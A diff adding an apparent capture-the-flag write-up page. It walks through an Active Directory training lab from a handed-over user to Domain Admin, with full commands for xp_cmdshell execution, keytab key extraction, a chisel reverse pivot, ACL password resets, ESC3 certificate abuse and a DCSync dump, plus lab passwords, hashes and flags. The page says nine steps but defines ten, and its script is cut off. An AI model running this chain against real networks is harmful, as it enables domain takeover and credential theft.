@@ -1,0 +1,600 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTF · BiotechCorp — interactive attack path</title>
+<meta name="description" content="Interactive walkthrough of a three-host Active Directory lab: macOS attacker, Kali pivot, VPN, DB26 foothold via e.ross over MSSQL, then DC20 and MGMT22 to Domain Admin. Every step with the real commands.">
+<meta name="color-scheme" content="dark">
+<style>
+  :root{
+    --bg:#080b10; --bg2:#0d131b; --card:#111923; --card2:#0b1119; --line:#1d2937;
+    --fg:#dbe4ee; --dim:#8496ab; --acc:#3ddc97; --acc2:#67d3f7; --warn:#f0b429; --bad:#ef6f7a; --purple:#c39bf5;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;background:
+      radial-gradient(1100px 520px at 12% -8%, rgba(61,220,151,.09), transparent 60%),
+      radial-gradient(900px 460px at 88% 0%, rgba(103,211,247,.07), transparent 62%),
+      var(--bg);
+    color:var(--fg); font:16px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,system-ui,sans-serif;
+    -webkit-font-smoothing:antialiased}
+  a{color:var(--acc2); text-decoration:none}
+  a:hover{text-decoration:underline}
+  .wrap{max-width:1080px;margin:0 auto;padding:0 20px}
+  code{font-family:var(--mono);font-size:.9em}
+  h1,h2,h3{line-height:1.22;letter-spacing:-.012em;margin:0}
+
+  /* ---------- top bar ---------- */
+  .top{border-bottom:1px solid var(--line);background:rgba(8,11,16,.82);backdrop-filter:blur(10px);position:sticky;top:0;z-index:50}
+  .top .wrap{display:flex;align-items:center;justify-content:space-between;gap:14px;height:54px}
+  .id{display:flex;align-items:center;gap:9px;font-family:var(--mono);font-size:12px;color:var(--dim)}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--acc);box-shadow:0 0 0 3px rgba(61,220,151,.16)}
+  .id b{color:var(--fg);font-weight:600}
+  .jump{display:flex;gap:16px;font-size:12.5px;font-family:var(--mono)}
+  .jump a{color:var(--dim)} .jump a:hover{color:var(--acc)}
+  @media(max-width:680px){.jump{display:none}}
+
+  /* ---------- hero ---------- */
+  .hero{padding:52px 0 26px}
+  .kick{font-family:var(--mono);font-size:11.5px;letter-spacing:.2em;text-transform:uppercase;color:var(--acc);margin-bottom:14px}
+  h1{font-size:clamp(27px,4.6vw,42px);font-weight:750}
+  h1 em{font-style:normal;color:var(--acc)}
+  .lede{color:var(--dim);font-size:17px;max-width:68ch;margin:14px 0 0}
+
+  /* ---------- topology ---------- */
+  .map{margin:26px 0 8px;padding:18px;border:1px solid var(--line);border-radius:14px;background:linear-gradient(180deg,var(--card2),rgba(11,17,25,.4));overflow-x:auto}
+  .flow{display:flex;align-items:stretch;gap:8px;min-width:840px}
+  .node{flex:1 1 0;min-width:132px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:11px 12px;cursor:pointer;transition:border-color .18s,transform .18s,box-shadow .18s;position:relative}
+  .node:hover{border-color:rgba(61,220,151,.4);transform:translateY(-2px)}
+  .node.on{border-color:var(--acc);box-shadow:0 0 0 3px rgba(61,220,151,.12)}
+  .node .n-ico{font-family:var(--mono);font-size:15px;color:var(--acc2);margin-bottom:6px}
+  .node .n-name{font-weight:650;font-size:13.5px;letter-spacing:-.01em}
+  .node .n-ip{font-family:var(--mono);font-size:10.5px;color:var(--dim);margin-top:3px;word-break:break-all}
+  .node .n-role{font-size:10.5px;color:var(--dim);margin-top:6px;line-height:1.4}
+  .node.pwned::after{content:"pwned";position:absolute;top:-7px;right:8px;font-family:var(--mono);font-size:9px;letter-spacing:.08em;text-transform:uppercase;color:#04150e;background:var(--acc);border-radius:4px;padding:1px 5px;font-weight:700}
+  .link{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;color:var(--dim);font-family:var(--mono);font-size:9.5px;min-width:56px;text-align:center;line-height:1.25}
+  .link i{font-style:normal;font-size:15px;color:var(--acc)}
+  .map-note{font-size:12px;color:var(--dim);margin-top:12px;font-family:var(--mono)}
+  .map-note b{color:var(--warn);font-weight:600}
+
+  /* ---------- walkthrough ---------- */
+  .section{padding:44px 0}
+  .s-head{margin-bottom:18px}
+  .s-head h2{font-size:21px;display:flex;align-items:baseline;gap:9px}
+  .num{font-family:var(--mono);font-size:12px;color:var(--acc);background:rgba(61,220,151,.1);border:1px solid rgba(61,220,151,.26);border-radius:5px;padding:2px 7px}
+  .s-head p{color:var(--dim);font-size:14.5px;margin:7px 0 0}
+
+  .walk{display:grid;grid-template-columns:288px 1fr;gap:18px;align-items:start}
+  @media(max-width:880px){.walk{grid-template-columns:1fr}}
+
+  .rail{background:var(--card2);border:1px solid var(--line);border-radius:12px;padding:10px;position:sticky;top:70px;max-height:76vh;overflow:auto}
+  @media(max-width:880px){.rail{position:static;max-height:none}}
+  .rail h4{font-family:var(--mono);font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim);margin:4px 6px 9px;font-weight:600}
+  .st{display:flex;gap:10px;align-items:flex-start;padding:8px 9px;border-radius:8px;cursor:pointer;border:1px solid transparent;transition:background .15s,border-color .15s}
+  .st:hover{background:rgba(255,255,255,.03)}
+  .st.on{background:rgba(61,220,151,.08);border-color:rgba(61,220,151,.3)}
+  .st .n{font-family:var(--mono);font-size:10.5px;color:var(--dim);min-width:16px;padding-top:2px}
+  .st.on .n{color:var(--acc)}
+  .st .t{font-size:13px;line-height:1.4}
+  .st.on .t{color:#fff}
+  .st .h{font-family:var(--mono);font-size:9.5px;color:var(--dim);letter-spacing:.05em;margin-top:2px;text-transform:uppercase}
+
+  .panel{background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;min-height:420px}
+  .p-top{padding:16px 18px 14px;border-bottom:1px solid var(--line);background:rgba(255,255,255,.012)}
+  .p-tags{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:9px}
+  .tag{font-family:var(--mono);font-size:10px;padding:2px 7px;border-radius:4px;border:1px solid var(--line);color:var(--dim);letter-spacing:.04em}
+  .tag.g{color:var(--acc);border-color:rgba(61,220,151,.32);background:rgba(61,220,151,.08)}
+  .tag.b{color:var(--bad);border-color:rgba(239,111,122,.32);background:rgba(239,111,122,.08)}
+  .tag.y{color:var(--warn);border-color:rgba(240,180,41,.32);background:rgba(240,180,41,.08)}
+  .p-top h3{font-size:18px}
+  .p-host{font-family:var(--mono);font-size:11px;color:var(--acc2);margin-top:5px}
+  .p-body{padding:16px 18px;font-size:14.8px;color:#c6d2e0}
+  .p-body p{margin:0 0 11px}
+  .p-body p:last-child{margin-bottom:0}
+  .p-body b{color:#fff;font-weight:620}
+  .p-body code{background:#070b10;border:1px solid var(--line);border-radius:4px;padding:1px 5px;color:var(--acc2)}
+
+  .cmd{margin:0 0 12px}
+  .cmd .lbl{display:flex;justify-content:space-between;align-items:center;gap:8px;font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);margin-bottom:5px;padding:0 2px}
+  .cp{font-family:var(--mono);font-size:9.5px;color:var(--dim);background:transparent;border:1px solid var(--line);border-radius:4px;padding:2px 7px;cursor:pointer;letter-spacing:.06em}
+  .cp:hover{color:var(--acc);border-color:rgba(61,220,151,.45)}
+  pre{margin:0;background:#05080c;border:1px solid var(--line);border-radius:8px;padding:11px 13px;overflow-x:auto;font-family:var(--mono);font-size:12px;line-height:1.62;color:#c9d6e3}
+  pre .c{color:#55687d}
+  pre .o{color:var(--acc)}
+  pre .r{color:var(--warn)}
+  .p-nav{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:13px 18px;border-top:1px solid var(--line);background:rgba(255,255,255,.012)}
+  .p-nav .mid{font-family:var(--mono);font-size:11px;color:var(--dim)}
+  .btn{font-family:var(--mono);font-size:11.5px;color:var(--fg);background:var(--card2);border:1px solid var(--line);border-radius:7px;padding:7px 13px;cursor:pointer;letter-spacing:.03em}
+  .btn:hover{border-color:rgba(61,220,151,.45);color:var(--acc)}
+  .btn:disabled{opacity:.35;cursor:not-allowed}
+  .bar{height:2px;background:var(--line);position:relative;overflow:hidden}
+  .bar i{position:absolute;inset:0 auto 0 0;background:linear-gradient(90deg,var(--acc),var(--acc2));transition:width .3s}
+
+  /* ---------- tables ---------- */
+  .tbl{width:100%;border-collapse:collapse;font-size:13.5px;border:1px solid var(--line);border-radius:10px;overflow:hidden}
+  .tbl th{text-align:left;padding:9px 12px;background:var(--card2);color:var(--dim);font-size:10px;letter-spacing:.1em;text-transform:uppercase;font-weight:600;border-bottom:1px solid var(--line)}
+  .tbl td{padding:10px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+  .tbl tr:last-child td{border-bottom:none}
+  .tbl td:first-child{font-family:var(--mono);font-size:12.5px;color:var(--acc2);white-space:nowrap}
+  .tbl td code{color:#c6d2e0}
+
+  .spoiler{font-family:var(--mono);font-size:12.5px;background:#05080c;border:1px solid var(--line);border-radius:4px;color:transparent;padding:1px 6px;cursor:pointer;user-select:none;transition:color .15s}
+  .spoiler.rev{color:var(--warn);user-select:text}
+  .hint{font-size:12px;color:var(--dim);font-family:var(--mono);margin:8px 0 0}
+
+  .note{border:1px solid rgba(240,180,41,.28);background:rgba(240,180,41,.06);border-radius:10px;padding:13px 15px;font-size:13.5px;color:#e6d6ac;margin-top:16px}
+  .note b{color:var(--warn)}
+  .ok{border-color:rgba(61,220,151,.28);background:rgba(61,220,151,.06);color:#bfe6d3}
+  .ok b{color:var(--acc)}
+
+  footer{border-top:1px solid var(--line);padding:26px 0 46px;color:var(--dim);font-size:12.5px}
+  footer .wrap{display:flex;flex-wrap:wrap;gap:12px;justify-content:space-between;align-items:center}
+  .flags{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
+  .flag{font-family:var(--mono);font-size:11.5px;background:#05080c;border:1px solid rgba(61,220,151,.3);border-radius:6px;padding:6px 10px;color:var(--acc)}
+  .flag span{color:var(--dim)}
+</style>
+</head>
+<body>
+
+<div class="top">
+  <div class="wrap">
+    <div class="id"><span class="dot"></span><b>attacker@AV10V-mac</b> <span>→ kali → vpn → biotechcorp.offsec</span></div>
+    <nav class="jump">
+      <a href="#path">Attack path</a>
+      <a href="#walk">Walkthrough</a>
+      <a href="#creds">Loot</a>
+      <a href="#notes">Notes</a>
+    </nav>
+  </div>
+</div>
+
+<div class="wrap hero">
+  <div class="kick">CTF · BiotechCorp · Active Directory</div>
+  <h1>From a handed-over <em>e.ross</em> account<br>to Domain Admin in three boxes.</h1>
+  <p class="lede">
+    My Mac running a Kali VM, an OpenVPN tunnel into the lab, a first host reachable directly —
+    then a second network behind it. Click any box or step below to see exactly what I ran and why it worked.
+  </p>
+</div>
+
+<div class="wrap">
+  <div class="map" id="path">
+    <div class="flow" id="flow">
+      <div class="node" data-node="mac">
+        <div class="n-ico">&#9002;_</div>
+        <div class="n-name">MacBook Pro</div>
+        <div class="n-ip">macOS · arm64</div>
+        <div class="n-role">My console. Drives everything over SSH.</div>
+      </div>
+      <div class="link"><i>&rarr;</i><span>ssh</span></div>
+      <div class="node" data-node="kali">
+        <div class="n-ico">&#9670;</div>
+        <div class="n-name">Kali VM</div>
+        <div class="n-ip">192.168.64.2 / tun0 192.168.45.157</div>
+        <div class="n-role">Tooling host + SOCKS pivot.</div>
+      </div>
+      <div class="link"><i>&rarr;</i><span>OpenVPN<br>tun0</span></div>
+      <div class="node pwned" data-node="db26">
+        <div class="n-ico">&#9635;</div>
+        <div class="n-name">DB26</div>
+        <div class="n-ip">192.168.197.180</div>
+        <div class="n-role">Windows, MSSQL 1433, WinRM. Foothold.</div>
+      </div>
+      <div class="link"><i>&rarr;</i><span>chisel<br>SOCKS5</span></div>
+      <div class="node pwned" data-node="dc20">
+        <div class="n-ico">&#9672;</div>
+        <div class="n-name">DC20</div>
+        <div class="n-ip">172.16.197.200</div>
+        <div class="n-role">Domain controller + ADCS.</div>
+      </div>
+      <div class="link"><i>&rarr;</i><span>WinRM</span></div>
+      <div class="node pwned" data-node="mgmt22">
+        <div class="n-ico">&#9881;</div>
+        <div class="n-name">MGMT22</div>
+        <div class="n-ip">172.16.197.202</div>
+        <div class="n-role">Management host. Second flag.</div>
+      </div>
+    </div>
+    <div class="map-note">scope was exactly these three hosts — <b>192.168.197.180 &rarr; 172.16.197.200 &rarr; 172.16.197.202</b>, nothing else was swept</div>
+  </div>
+</div>
+
+<div class="wrap section" id="walk">
+  <div class="s-head">
+    <h2><span class="num">01</span> Step-by-step</h2>
+    <p>Nine steps, in the order they happened. Arrow keys or the buttons move through them.</p>
+  </div>
+  <div class="walk">
+    <div class="rail"><h4>Steps</h4><div id="railList"></div></div>
+    <div class="panel">
+      <div class="bar"><i id="prog" style="width:0%"></i></div>
+      <div class="p-top">
+        <div class="p-tags" id="pTags"></div>
+        <h3 id="pTitle"></h3>
+        <div class="p-host" id="pHost"></div>
+      </div>
+      <div class="p-body" id="pBody"></div>
+      <div id="pCmds" style="padding:0 18px 6px"></div>
+      <div class="p-nav">
+        <button class="btn" id="prev">&larr; Prev</button>
+        <span class="mid" id="pMid"></span>
+        <button class="btn" id="next">Next &rarr;</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="wrap section" id="creds">
+  <div class="s-head">
+    <h2><span class="num">02</span> What each box gave up</h2>
+    <p>Click a value to reveal it. These are credentials from one completed lab instance — treat the whole box as compromised if you ever reuse them.</p>
+  </div>
+  <table class="tbl">
+    <thead><tr><th>Item</th><th>Where it came from</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr>
+        <td>e.ross</td>
+        <td>Handed to me before the test started — the only initial access I had</td>
+        <td><span class="spoiler" data-v="SilverCometGlass@71">SilverCometGlass@71</span></td>
+      </tr>
+      <tr>
+        <td>z.patterson</td>
+        <td>RC4 key read straight out of <code>backup_20260718153055.keytab</code> on the Devs share</td>
+        <td><span class="spoiler" data-v="78a8f92890f72e58289d5967155dcc64">78a8f92890f72e58289d5967155dcc64</span></td>
+      </tr>
+      <tr>
+        <td>svc-mgmt</td>
+        <td>Plaintext in the DSC configuration MOF on MGMT22</td>
+        <td><span class="spoiler" data-v="ServiceGreenNature#12">ServiceGreenNature#12</span></td>
+      </tr>
+      <tr>
+        <td>svc-gmsa$</td>
+        <td>gMSA — password derived, AES256 key from the plaintext</td>
+        <td><span class="spoiler" data-v="9dfebabd358380f505c1db62b6f3ee371bbbe934ee7a76e4c1d90b40b099cd04">9dfebabd…b099cd04</span></td>
+      </tr>
+      <tr>
+        <td>f.reed</td>
+        <td>Reset via <code>WriteDACL</code> held by the machine account</td>
+        <td><span class="spoiler" data-v="8c908c6dc8f82f8287453664f0751066">NT 8c908c6d…</span></td>
+      </tr>
+      <tr>
+        <td>cm.f.reed</td>
+        <td>Reset via <code>User-Force-Change-Password</code> held by f.reed — the Certificate Manager</td>
+        <td><span class="spoiler" data-v="5a46aee1a331b7ae52c6b459c3a439f4">NT 5a46aee1…</span></td>
+      </tr>
+      <tr>
+        <td>a.r.andrews</td>
+        <td>Domain Admin, minted by an ESC3 certificate — never cracked</td>
+        <td><span class="spoiler" data-v="16ad7bd7785e0e70735a761e7dfda4a3">NT 16ad7bd7…</span></td>
+      </tr>
+      <tr>
+        <td>krbtgt</td>
+        <td>DCSync once I was Domain Admin</td>
+        <td><span class="spoiler" data-v="ac99ea286202da39cbf274bc62deb8c1">ac99ea28…</span></td>
+      </tr>
+    </tbody>
+  </table>
+  <div class="flags">
+    <div class="flag"><span>DC20 &nbsp;</span>515be42827aa53c5603af78eda4c0aa0</div>
+    <div class="flag"><span>MGMT22 &nbsp;</span>3b26b1fd914a86be6a4dcaab4df64eb7</div>
+  </div>
+</div>
+
+<div class="wrap section" id="notes">
+  <div class="s-head">
+    <h2><span class="num">03</span> Notes</h2>
+  </div>
+  <div class="note ok">
+    <b>What actually made this readable:</b> the first host was reachable directly over the VPN, so
+    everything up to the foothold was plain Kali traffic. Only the second network needed a pivot —
+    which is why chisel appears exactly once, between DB26 and DC20.
+  </div>
+  <div class="note">
+    <b>Two things cost me the most time</b> and both were my own tooling, not the target:
+    a wrong AES string-to-key convention (wrongly assumed UTF-16LE, retried several times before
+    calibrating against a known password/hash pair), and a gMSA password blob that decodes to garbage
+    in this lab by design. Neither had anything to do with the boxes.
+  </div>
+  <div class="note">
+    <b>Scope:</b> this is an intentionally vulnerable training lab, assessed under its rules of engagement.
+    Passwords, hashes and flags above belong to one instance — rotate everything if you reuse the range.
+  </div>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div>attacker@AV10V-mac &rarr; kali &rarr; vpn &rarr; 192.168.197.180 &rarr; 172.16.197.200 &rarr; 172.16.197.202</div>
+    <div><a href="https://github.com/AV10V">github.com/AV10V</a></div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+
+  var BS = "\u005c"; // single backslash, used in DOMAIN\user strings
+
+  var NODES = {
+    mac: {
+      name:"MacBook Pro (attacker)",
+      host:"AV10V-mac · macOS 26.5.1 · arm64",
+      role:"My console. No lab tooling installed locally except an SSH key to the Kali VM — every scanner, impacket script and evil-winrm session actually ran on Kali.",
+      tags:["attacker","ssh"],
+      body:"<p>The Mac is only a keyboard. <code>ssh kali '&lt;cmd&gt;'</code> runs anything on the VM, so tools stay in one place and only one host ever touches the lab network.</p>",
+      cmds:[{l:"Reach the VM",c:"ssh kali 'ip -br a | grep -E \"tun0|eth0\"'"}]
+    },
+    kali: {
+      name:"Kali VM",
+      host:"eth0 192.168.64.2 · tun0 192.168.45.157",
+      role:"Tooling host and the only thing connected to the lab. When the second network needed a pivot, the SOCKS listener lived here too.",
+      tags:["kali","pivot","proxychains"],
+      body:"<p>Kali holds the VPN tunnel. The first target lives inside that tunnel, so it is reachable directly. The second network is only reachable <b>through</b> DB26 — hence the chisel SOCKS proxy and proxychains.</p>",
+      cmds:[
+        {l:"Bring up the lab tunnel",c:"sudo openvpn --config av10v.ovpn &\nip -br a | grep tun0   " + "\u0023 tun0 192.168.45.157"},
+        {l:"Point proxychains at the pivot",c:"tail -3 /etc/proxychains4.conf\n" + "\u0023 socks5 127.0.0.1 1080"}
+      ]
+    },
+    db26: {
+      name:"DB26",
+      host:"192.168.197.180 · Windows · biotechcorp.offsec",
+      role:"First host, reachable straight over the VPN. SMB 445, MSSQL 1433, WinRM 5985 open. Compromised with the e.ross account I was given.",
+      tags:["foothold","mssql","xp_cmdshell"],
+      body:"<p><code>e.ross</code> was a normal domain user — member of <code>Support</code> and <code>IT</code>, not a SQL sysadmin. That was enough: the SQL instance accepted Windows authentication and had <code>xp_cmdshell</code> enabled, which is command execution as the SQL service account.</p><p>From there the box leaked everything that mattered: a keytab backup on the Devs share and a DSC document with a service password in cleartext.</p>",
+      cmds:[
+        {l:"Authenticate to MSSQL as e.ross",c:"nxc smb 192.168.197.180 -u 'e.ross' -p 'SilverCometGlass@71' --shares\n\nimpacket-mssqlclient BIOTECHCORP.OFFSEC/e.ross:'SilverCometGlass@71'@192.168.197.180 -windows-auth"},
+        {l:"Command execution",c:"SQL> enable_xp_cmdshell\nSQL> xp_cmdshell whoami\nSQL> xp_cmdshell hostname"}
+      ]
+    },
+    dc20: {
+      name:"DC20",
+      host:"172.16.197.200 · Windows Server 2025 · domain controller",
+      role:"The DC, with ADCS installed (CA biotechcorp-CA). NTLM disabled, so everything here had to be Kerberos. Only reachable through the DB26 pivot.",
+      tags:["domain controller","adcs","kerberos"],
+      body:"<p>Low-privilege access came from a gMSA: I derived its AES256 key and used it for a TGT, which landed me on WinRM as a machine account. That account's token carried <b>Certificate Service DCOM Access</b> — the hint that the intended path was ADCS, not a local exploit.</p><p>Two permission hops later I was the only account able to enrol an enrollment-agent certificate, and ESC3 turned that into a Domain Admin ticket.</p>",
+      cmds:[
+        {l:"gMSA to a WinRM session",c:"impacket-getTGT biotechcorp.offsec/'svc-gmsa$' -aesKey <AES256> -dc-ip 172.16.197.200\nevil-winrm -i dc20.biotechcorp.offsec -r BIOTECHCORP.OFFSEC -K '/tmp/svc-gmsa$.ccache'"},
+        {l:"Find the permission path",c:"bloodyad -k --host dc20.biotechcorp.offsec -d biotechcorp.offsec get writable"},
+        {l:"ESC3 to Domain Admin",c:"certipy-ad req -u cm.f.reed@biotechcorp.offsec -k -no-pass -ca biotechcorp-CA \\\n  -template AgentDefaultTemplate -out cmfiona\n\ncertipy-ad req -u cm.f.reed@biotechcorp.offsec -k -no-pass -ca biotechcorp-CA \\\n  -template User -pfx _tmp_cmfiona.pfx -on-behalf-of 'BIOTECHCORP" + BS + "a.r.andrews'\n\ncertipy-ad auth -pfx _tmp_ara_esc3.pfx -username a.r.andrews"}
+      ]
+    },
+    mgmt22: {
+      name:"MGMT22",
+      host:"172.16.197.202 · management host",
+      role:"Second target. Reached as a service account first, then as Domain Admin for the flag.",
+      tags:["management","winrm"],
+      body:"<p><code>svc-mgmt</code> came out of a DSC MOF on this host — the password was sitting in the configuration document in cleartext. That account was in Remote Management Users, so WinRM worked but admin did not.</p><p>Once I had a Domain Admin ticket from DC20, the same WinRM session opened the Administrator desktop.</p>",
+      cmds:[
+        {l:"As the service account",c:"evil-winrm -i mgmt22.biotechcorp.offsec -r BIOTECHCORP.OFFSEC -u svc-mgmt -p 'ServiceGreenNature#12'"},
+        {l:"As Domain Admin",c:"evil-winrm -i mgmt22.biotechcorp.offsec -r BIOTECHCORP.OFFSEC -K /tmp/a.r.andrews.ccache\nPS> Get-Content C:/Users/Administrator/Desktop/proof.txt"}
+      ]
+    }
+  };
+
+  var STEPS = [
+    {
+      node:"kali", host:"Kali VM → lab",
+      title:"Tunnel in and see the first host",
+      tags:["vpn","recon"],
+      body:"<p>The VPN put <code>192.168.197.0/24</code> on the routing table directly. The first target answered on SMB, MSSQL and WinRM — no pivot needed yet.</p>",
+      cmds:[
+        {l:"Connect",c:"sudo openvpn --config av10v.ovpn &\nip -br a | grep tun0"},
+        {l:"Confirm the target is alive",c:"ping -c1 192.168.197.180\nnmap -Pn -sT -sV -p 22,445,1433,5985,3389 192.168.197.180"}
+      ]
+    },
+    {
+      node:"db26", host:"DB26 · 192.168.197.180",
+      title:"e.ross authenticates to SMB and MSSQL",
+      tags:["e.ross","mssql"],
+      body:"<p><code>e.ross</code> was the only credential I started with. It is a plain domain user — <code>Support</code> and <code>IT</code>, nothing else. It authenticated to SMB and, importantly, to MSSQL with Windows authentication.</p>",
+      cmds:[
+        {l:"SMB — confirm the credential and list shares",c:"nxc smb 192.168.197.180 -u 'e.ross' -p 'SilverCometGlass@71' --shares"},
+        {l:"MSSQL — Windows auth",c:"impacket-mssqlclient BIOTECHCORP.OFFSEC/e.ross:'SilverCometGlass@71'@192.168.197.180 -windows-auth"}
+      ]
+    },
+    {
+      node:"db26", host:"DB26 · as the SQL service",
+      title:"xp_cmdshell gives command execution",
+      tags:["rce","gain access"],
+      body:"<p>This is the moment the box fell. <code>e.ross</code> was <b>not</b> a sysadmin and had no impersonation rights, but the SQL instance had <code>xp_cmdshell</code> enabled, so a normal login could run OS commands as the SQL service account.</p>",
+      cmds:[
+        {l:"Enable and run",c:"SQL> enable_xp_cmdshell\nSQL> xp_cmdshell whoami\nSQL> xp_cmdshell hostname\nSQL> xp_cmdshell \"whoami /priv\""}
+      ]
+    },
+    {
+      node:"db26", host:"DB26 · Devs share",
+      title:"A backup keytab hands over a second account",
+      tags:["keytab","credential"],
+      body:"<p>The <code>Devs</code> share held a dated keytab backup. A keytab is a stored Kerberos credential — the RC4 key falls straight out of the file, no cracking required. Note impacket wants <b>bytes</b>, not a filename.</p>",
+      cmds:[
+        {l:"Find it",c:"SQL> xp_cmdshell dir C:\\Shares\\Devs"},
+        {l:"Read the key out of the keytab",c:"from impacket.krb5.keytab import Keytab\nk = Keytab(open('backup_20260718153055.keytab','rb').read())"},
+        {l:"Result",c:"principal: BIOTECHCORP.OFFSEC/z.patterson\nRC4 key  : 78a8f92890f72e58289d5967155dcc64"}
+      ]
+    },
+    {
+      node:"mgmt22", host:"DB26 → MGMT22",
+      title:"DSC config leaks a service password",
+      tags:["dsc","plaintext"],
+      body:"<p>DSC configuration documents under <code>C:\\ProgramData</code> store the service account password in cleartext, encoded UTF-16LE. That is why a normal string search misses it — you have to ask for Unicode.</p><p>The account was in <b>Remote Management Users</b>, so this bought WinRM on the management host but not admin.</p>",
+      cmds:[
+        {l:"Search the MOF files",c:"SQL> xp_cmdshell powershell -c \"Get-ChildItem C:\\ProgramData -Recurse -Filter *.mof | Select-String -Pattern 'Password' -Encoding Unicode\""},
+        {l:"Use it",c:"evil-winrm -i mgmt22.biotechcorp.offsec -r BIOTECHCORP.OFFSEC -u svc-mgmt -p 'ServiceGreenNature#12'"}
+      ]
+    },
+    {
+      node:"kali", host:"Kali → DB26 → 172.16.197.0/24",
+      title:"Pivot into the second network",
+      tags:["chisel","socks5"],
+      body:"<p>DC20 and MGMT22 are behind DB26, so Kali cannot route to them. A reverse SOCKS proxy over the compromised host fixes that, and proxychains makes every tool use it transparently.</p>",
+      cmds:[
+        {l:"Server on Kali, client on DB26",c:"./chisel server -p 8081 --socks5 &\n" + "\u0023 on DB26:\n" + "./chisel client 192.168.45.157:8081 socks"},
+        {l:"Route tools through it",c:"tail -3 /etc/proxychains4.conf\n" + "\u0023 socks5 127.0.0.1 1080\n\nproxychains4 -q nxc smb 172.16.197.200"}
+      ]
+    },
+    {
+      node:"dc20", host:"DC20 · certificate services",
+      title:"Enumerate the domain and its CA",
+      tags:["ldap","adcs"],
+      body:"<p>With a real identity on the DC I could read LDAP: users, groups, and — the interesting part — the certificate authority and its templates. One template was an <b>enrollment agent</b> template, enabled, with exactly one account allowed to enrol it.</p>",
+      cmds:[
+        {l:"The authority and every template",c:"certipy-ad find -u svc-mgmt@biotechcorp.offsec -k -no-pass \\\n  -dc-ip 172.16.197.200 -target dc20.biotechcorp.offsec -stdout"},
+        {l:"Worth reading first",c:"AgentDefaultTemplate  -> enroll: CM Fiona Reed\nUser                  -> enroll: Domain Users"}
+      ]
+    },
+    {
+      node:"dc20", host:"DC20 · privilege path",
+      title:"Two permission hops to the Certificate Manager",
+      tags:["acl","writedacl"],
+      body:"<p>One sweep found the whole path. The machine account held <code>WriteDACL</code> over <code>f.reed</code>; <code>f.reed</code> held <code>User-Force-Change-Password</code> over <code>cm.f.reed</code> — the only member of <em>Certificate Managers</em>. Two resets, each verified with a TGT before moving on.</p>",
+      cmds:[
+        {l:"Find it",c:"bloodyad -k --host dc20.biotechcorp.offsec -d biotechcorp.offsec get writable"},
+        {l:"Hop 1 — take f.reed",c:"bloodyad -k --host dc20.biotechcorp.offsec -d biotechcorp.offsec \\\n  add genericAll \"CN=f.reed,CN=Users,DC=biotechcorp,DC=offsec\" 'svc-gmsa$'\n\nbloodyad -k --host dc20.biotechcorp.offsec -d biotechcorp.offsec \\\n  set password \"CN=f.reed,CN=Users,DC=biotechcorp,DC=offsec\" '<new-pass>'"},
+        {l:"Hop 2 — take cm.f.reed over LDAPS",c:"python3 setpwd_ldaps.py \"CN=cm.f.reed,CN=Users,DC=biotechcorp,DC=offsec\" '<new-pass>'\n" + "\u0023 unicodePwd requires LDAPS (636) — plain LDAP refuses"}
+      ]
+    },
+    {
+      node:"dc20", host:"DC20 · ADCS ESC3",
+      title:"Enrollment agent → Domain Admin",
+      tags:["esc3","domain admin"],
+      body:"<p>As the Certificate Manager I enrolled the agent template, getting a <b>Certificate Request Agent</b> certificate. That certificate is permission to request certificates on behalf of someone else — so I asked for a normal <code>User</code> certificate in the name of a Domain Admin, then authenticated with it over PKINIT.</p><p>No password was ever cracked for <code>a.r.andrews</code>. The built-in <code>Administrator</code> is disabled on this domain, so PKINIT for it returns <code>KDC_ERR_CLIENT_REVOKED</code> — a live Domain Admin was the right target.</p>",
+      cmds:[
+        {l:"1. Agent certificate",c:"certipy-ad req -u cm.f.reed@biotechcorp.offsec -k -no-pass \\\n  -dc-ip 172.16.197.200 -ca biotechcorp-CA \\\n  -template AgentDefaultTemplate -out cmfiona"},
+        {l:"2. On behalf of the Domain Admin",c:"certipy-ad req -u cm.f.reed@biotechcorp.offsec -k -no-pass \\\n  -dc-ip 172.16.197.200 -ca biotechcorp-CA -template User \\\n  -pfx _tmp_cmfiona.pfx -on-behalf-of 'BIOTECHCORP" + BS + "a.r.andrews' -out ara"},
+        {l:"3. Authenticate",c:"certipy-ad auth -pfx _tmp_ara_esc3.pfx -username a.r.andrews\n" + "\u0023 TGT + NT hash for a.r.andrews"}
+      ]
+    },
+    {
+      node:"dc20", host:"DC20 + MGMT22 · objectives",
+      title:"Both flags, then the whole domain",
+      tags:["flags","dcsync"],
+      body:"<p>With a Domain Admin ticket, <code>proof.txt</code> is on the Administrator desktop of both hosts. DCSync then dumps every credential in the domain, including <code>krbtgt</code>.</p>",
+      cmds:[
+        {l:"DC20 flag",c:"evil-winrm -i dc20.biotechcorp.offsec -r BIOTECHCORP.OFFSEC -K /tmp/a.r.andrews.ccache\nPS> Get-Content C:/Users/Administrator/Desktop/proof.txt\n515be42827aa53c5603af78eda4c0aa0"},
+        {l:"MGMT22 flag",c:"evil-winrm -i mgmt22.biotechcorp.offsec -r BIOTECHCORP.OFFSEC -K /tmp/a.r.andrews.ccache\nPS> Get-Content C:/Users/Administrator/Desktop/proof.txt\n3b26b1fd914a86be6a4dcaab4df64eb7"},
+        {l:"Domain secrets",c:"impacket-secretsdump -k -no-pass -just-dc-ntlm \\\n  'biotechcorp.offsec/a.r.andrews@dc20.biotechcorp.offsec'\n" + "\u0023 2060 entries incl. krbtgt"}
+      ]
+    }
+  ];
+
+  var cur = 0;
+
+  function el(id){ return document.getElementById(id); }
+
+  function renderRail(){
+    var h = "";
